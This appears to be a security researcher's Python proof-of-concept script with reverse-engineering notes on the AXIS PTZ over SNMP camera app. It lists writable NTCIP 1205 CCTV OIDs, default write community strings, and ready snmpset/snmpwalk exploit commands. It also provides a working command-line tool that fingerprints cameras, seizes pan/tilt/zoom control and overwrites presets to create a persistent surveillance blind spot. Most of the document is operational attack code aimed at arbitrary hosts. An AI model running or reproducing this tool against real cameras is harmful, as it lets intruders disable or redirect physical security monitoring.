"""
AXIS PTZ over SNMP (axptzoversnmp) — MIPS32 RE findings
CONTROLLED ENVIRONMENT ONLY

Affected: AXIS PTZ over SNMP (axptzoversnmp), appId 47267
Arch: MIPS32 little-endian (mipsisa32r2el), legacy hardware

Root cause: NTCIP 1205 CCTV MIB OIDs writable via SNMP SET with default
"write" community string. Full PTZ camera control (pan, tilt, zoom, focus,
iris, preset) reachable over UDP/161 with no camera web auth required.

Library: lib/libPTZoverSNMP.so implements ax_mib_set_obj_val for all OIDs.
D-Bus chain: SNMP SET -> ptzoversnmp_set -> ptzoversnmp_dbus_move ->
             D-Bus com.axis.PTZ.Coordinator

Default Axis SNMP write community: "write" or "private" (admin-configurable).
No TLS/SNMPv3 observed in binary — all PTZ control over cleartext SNMP UDP/161.
"""

# CONTROLLED ENVIRONMENT ONLY

import argparse
import subprocess
import sys

FINDING = "AXIS-SNMP"
LABEL = "Unauthenticated PTZ control via SNMP SET (NTCIP 1205 CCTV MIB)"

# NTCIP 1205 CCTV MIB OID tree (base: 1.3.6.1.4.1.1206.4.2.7)
WRITABLE_OIDS = {
    "goto_preset":   ("1.3.6.1.4.1.1206.4.2.7.3.1.0", "i", "GoToPreset — move camera to preset number"),
    "set_preset":    ("1.3.6.1.4.1.1206.4.2.7.3.2.0", "i", "SetPreset — overwrite stored preset position"),
    "pan":           ("1.3.6.1.4.1.1206.4.2.7.4.1.0", "i", "Pan — centidegrees (-18000 to 18000)"),
    "tilt":          ("1.3.6.1.4.1.1206.4.2.7.4.2.0", "i", "Tilt — centidegrees"),
    "zoom":          ("1.3.6.1.4.1.1206.4.2.7.4.3.0", "i", "Zoom — tenths of 1x magnification"),
    "focus":         ("1.3.6.1.4.1.1206.4.2.7.4.4.0", "i", "Focus — relative focus control"),
    "iris":          ("1.3.6.1.4.1.1206.4.2.7.4.5.0", "i", "Iris — exposure control"),
    "cam_features":  ("1.3.6.1.4.1.1206.4.2.7.5.1.0", "i", "CameraFeatureControl — enable/disable features"),
    "lens_features": ("1.3.6.1.4.1.1206.4.2.7.5.4.0", "i", "LensFeatureControl"),
}

READABLE_OIDS = {
    "global_walk":   "1.3.6.1.4.1.1206",
    "model":         "1.3.6.1.4.1.1206.4.2.6.1",
    "firmware":      "1.3.6.1.4.1.1206.4.2.6.2",
}

FINDINGS = [
    {
        "id": "AXIS-SNMP-01",
        "severity": "HIGH",
        "title": "Unauthenticated PTZ control via SNMP SET (NTCIP 1205 CCTV MIB)",
        "detail": (
            "NTCIP CCTV MIB OIDs writable via SNMP SET with default write community. "
            "Full camera aim control: pan, tilt, zoom, focus, iris, preset manipulation. "
            "No camera web auth required — SNMP community string only. "
            "Default Axis write community is 'write' or 'private'."
        ),
        "exploit": "snmpset -c write -v 2c <ip> 1.3.6.1.4.1.1206.4.2.7.4.1.0 i <pan_centideg>",
        "prerequisite": "SNMP enabled + write community known (default 'write' or 'private')",
        "cve": None,
        "status": "UNPATCHED",
    },
    {
        "id": "AXIS-SNMP-02",
        "severity": "LOW",
        "title": "Device fingerprinting via SNMP GET (read community)",
        "detail": (
            "Global module OIDs (1.3.6.1.4.1.1206.4.2.6.*) expose model, firmware version, "
            "and hardware version without camera web auth. "
            "Read community default is 'public' on most Axis deployments with SNMP enabled."
        ),
        "exploit": "snmpwalk -c public -v 2c <ip> 1.3.6.1.4.1.1206",
        "prerequisite": "SNMP enabled (read community known)",
        "cve": None,
        "status": "UNPATCHED",
    },
    {
        "id": "AXIS-SNMP-03",
        "severity": "HIGH",
        "title": "Preset poisoning via SetPreset SNMP SET — persistent blind spot",
        "detail": (
            "OID 1.3.6.1.4.1.1206.4.2.7.3.2.0 (SetPreset) overwrites stored camera positions. "
            "Persists across reboots. Attacker creates permanent blind spot that survives "
            "until admin manually restores preset from camera web UI."
        ),
        "exploit": "snmpset -c write -v 2c <ip> 1.3.6.1.4.1.1206.4.2.7.3.2.0 i <preset_num>",
        "prerequisite": "SNMP write community access",
        "cve": None,
        "status": "UNPATCHED",
    },
]


def _snmpset(host: str, community: str, oid: str, oid_type: str, value: str, version: str = "2c") -> dict:
    cmd = ["snmpset", f"-v{version}", "-c", community, host, oid, oid_type, value]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        return {"ok": r.returncode == 0, "stdout": r.stdout.strip(), "stderr": r.stderr.strip()}
    except FileNotFoundError:
        return {"ok": False, "stdout": "", "stderr": "snmpset not found — install net-snmp"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "stdout": "", "stderr": "timeout"}


def _snmpwalk(host: str, community: str, oid: str, version: str = "2c") -> dict:
    cmd = ["snmpwalk", f"-v{version}", "-c", community, host, oid]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15)
        return {"ok": r.returncode == 0, "stdout": r.stdout.strip(), "stderr": r.stderr.strip()}
    except FileNotFoundError:
        return {"ok": False, "stdout": "", "stderr": "snmpwalk not found"}
    except subprocess.TimeoutExpired:
        return {"ok": False, "stdout": "", "stderr": "timeout"}


def fingerprint(host: str, community: str = "public") -> dict:
    r = _snmpwalk(host, community, READABLE_OIDS["global_walk"])
    return {"host": host, "community": community, "result": r}


def set_ptz(host: str, write_community: str, control: str, value: int) -> dict:
    if control not in WRITABLE_OIDS:
        raise ValueError(f"Unknown control: {control}. Use: {list(WRITABLE_OIDS)}")
    oid, oid_type, desc = WRITABLE_OIDS[control]
    r = _snmpset(host, write_community, oid, oid_type, str(value))
    return {"control": control, "oid": oid, "value": value, "description": desc, **r}


def poison_preset(host: str, write_community: str, preset_num: int, pan: int, tilt: int) -> list[dict]:
    results = []
    r1 = set_ptz(host, write_community, "goto_preset", preset_num)
    results.append(r1)
    r2 = set_ptz(host, write_community, "pan", pan)
    results.append(r2)
    r3 = set_ptz(host, write_community, "tilt", tilt)
    results.append(r3)
    r4 = set_ptz(host, write_community, "set_preset", preset_num)
    results.append(r4)
    return results


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=f"{FINDING}: {LABEL}")
    parser.add_argument("host", help="Camera IP")
    parser.add_argument("--read-community", default="public")
    parser.add_argument("--write-community", default="write")
    parser.add_argument("--control", choices=list(WRITABLE_OIDS), help="PTZ control to set")
    parser.add_argument("--value", type=int, help="Value to set (centidegrees for pan/tilt)")
    parser.add_argument("--fingerprint", action="store_true", help="SNMP walk for device info")
    parser.add_argument(
        "--poison-preset", type=int, metavar="PRESET",
        help="Poison preset N: goto preset, move camera off, save as new preset"
    )
    parser.add_argument("--pan", type=int, default=9000, help="Pan centidegrees for preset poison")
    parser.add_argument("--tilt", type=int, default=5000, help="Tilt centidegrees for preset poison")
    args = parser.parse_args()

    print(f"[{FINDING}] {LABEL}")
    print(f"  Target: {args.host}")
    print()

    if args.fingerprint:
        r = fingerprint(args.host, args.read_community)
        print(f"Walk result (community={args.read_community}):")
        print(r["result"]["stdout"] or r["result"]["stderr"])
    elif args.poison_preset is not None:
        results = poison_preset(args.host, args.write_community, args.poison_preset, args.pan, args.tilt)
        for r in results:
            status = "OK" if r["ok"] else "FAIL"
            print(f"  [{status}] {r.get('control','?')}: {r.get('stdout') or r.get('stderr')}")
    elif args.control:
        if args.value is None:
            print("ERROR: --value required with --control", file=sys.stderr)
            sys.exit(1)
        r = set_ptz(args.host, args.write_community, args.control, args.value)
        status = "OK" if r["ok"] else "FAIL"
        print(f"  [{status}] {args.control} = {args.value}")
        print(f"  OID: {r['oid']}")
        print(f"  Output: {r.get('stdout') or r.get('stderr')}")
    else:
        parser.print_help()
